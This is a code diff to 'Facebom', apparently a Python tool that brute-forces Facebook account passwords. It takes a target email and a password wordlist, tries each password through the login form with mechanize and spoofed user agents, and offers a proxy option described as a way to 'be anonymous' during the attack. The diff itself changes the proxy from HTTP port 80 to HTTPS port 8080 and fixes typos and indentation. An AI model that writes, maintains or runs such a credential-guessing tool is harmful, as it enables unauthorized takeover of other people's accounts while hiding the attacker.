@@ -12,8 +12,8 @@ try:
  ##-----------------------------------------------------------##
 except ImportError,e:
         e = e[0][16:]
-	print("[!] ImportError: ["+e+"] Module Is Missed \n[*] Please Install it Using this command> [ pip install "+e+" ]")
-	exit(1)
+        print("[!] ImportError: ["+e+"] Module Is Missed \n[*] Please Install it Using this command> [ pip install "+e+" ]")
+        exit(1)
 os.system("cls||clear")
 
 ## COLORS ###############
@@ -40,7 +40,7 @@ def cpro(ip):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.settimeout(5)
-        s.connect((ip, 80))
+        s.connect((ip, 8080))
         s.close()
         return True
     except socket.error:
@@ -83,43 +83,40 @@ def FBOM(username, wordlist, proxy=None):
         print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" No Such File: [ "+rd+str(wordlist)+yl+" ] "+rd+"!!!"+wi)
         exit(1)
     if proxy !=None:
-        print(wi+"["+yl+"~"+wi+"] Checking "+yl+"HTTP "+wi+"Proxy[ {}:80 ]...".format(proxy if ":" not in proxy else proxy.split(":")[0]))
+        print(wi+"["+yl+"~"+wi+"] Checking "+yl+"HTTPS "+wi+"Proxy[ {}:8080 ]...".format(proxy if ":" not in proxy else proxy.split(":")[0]))
         if ":" not in proxy:
             if proxy.count(".") ==3:
                 if cpro(proxy) == True:
                     print(wi+"["+gr+"Connected"+wi+"]")
-                    useproxy = proxy+":80"
+                    useproxy = proxy+":8080"
                 else:
                     print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
                     useproxy = False
-                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
+                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTPS Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
                     exit(1)
             else:
                 useproxy = False
-                print(rd+"\n["+yl+"!"+yl+"] Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
+                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+"Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                 exit(1)
         else:
             proxy = proxy.split(":")[0]
             if proxy.count(".") ==3:
                 if cpro(proxy) == True:
                     print(wi+"["+gr+"Connected"+wi+"]")
-                    useproxy = proxy+":80"
+                    useproxy = proxy+":8080"
                 else:
                     print(rd+"["+yl+"Connection Failed"+rd+"] !!!"+wi)
                     useproxy = False
-                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTP Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
+                    print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid HTTPS Proxy["+rd+str(proxy)+yl+"]"+rd+" !!!"+wi)
                     exit(1)
             else:
                 useproxy = False
-                print(rd+"\n["+yl+"!"+yl+"] Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
+                print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                 exit(1)
     else:
         useproxy = False
-        
-    if useproxy !=False: 
-        proxystatus = useproxy+wi+"["+gr+"ON"+wi+"]"
-    else:
-        proxystatus = yl+"["+rd+"OFF"+yl+"]"
+    prox = gr+useproxy.split(":")[0]+wi+":"+yl+useproxy.split(":")[1] if useproxy !=False else ""
+    proxystatus = prox+wi+"["+gr+"ON"+wi+"]" if useproxy !=False else yl+"["+rd+"OFF"+yl+"]"
     print(gr+"""
 ==================================
 [---]        """+wi+"""Facebom"""+gr+"""         [---]
@@ -139,7 +136,7 @@ def FBOM(username, wordlist, proxy=None):
     br=mechanize.Browser()
     br.set_handle_robots(False)
     if useproxy !=False:
-        br.set_proxies({'http':useproxy})
+        br.set_proxies({'https':useproxy})
     user_agent = useragent()
     br.addheaders=[('User-agent',user_agent)]
     wfile = open(wordlist, "r")
@@ -164,12 +161,12 @@ def FBOM(username, wordlist, proxy=None):
                 print(yl+"==> Login"+rd+" Failed\n")
             loop+=1
         except KeyboardInterrupt:
-            print(rd+"\n["+yl+"!"+rd+"][CTRL+C]..."+yl+"Exting"+wi)
+            print(rd+"\n["+yl+"!"+rd+"][CTRL+C]..."+yl+"Exiting"+wi)
             time.sleep(1.5)
             wfile.close()
             exit(1)
         except EOFError:
-            print(rd+"\n["+yl+"!"+rd+"][CTRL+C]..."+yl+"Exting"+wi)
+            print(rd+"\n["+yl+"!"+rd+"][CTRL+C]..."+yl+"Exiting"+wi)
             time.sleep(1.5)
             wfile.close()
             exit(1)
@@ -188,7 +185,7 @@ OPTIONS:
     |--------
     | -w <wordlist Path>                      ::> Specify Wordlist File Path
     |--------
-    | -p <ProxyIP>                            ::> Specify HTTP Proxy (Optional)
+    | -p <ProxyIP>                            ::> Specify HTTPS Proxy (Optional)
     |--------
     | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
 -------------
@@ -207,9 +204,9 @@ Examples:
 
 def Main():
    parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
-			help="Specify Target Email ")
+      help="Specify Target Email ")
    parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
-			help="Specify Wordlist File ")
+      help="Specify Wordlist File ")
    parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                         help="Specify HTTP Proxy To Be Anonymous When Attack Enable")
    parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
@@ -231,12 +228,10 @@ def Main():
    else:
        print(parse.usage)
        exit(1)
-       
 if __name__=='__main__':
-	Main()
-	
+  Main()
 ##############################################################
-##################### 		     #########################
+#####################                #########################
 #####################   END OF TOOL  #########################
 #####################                #########################
 ##############################################################
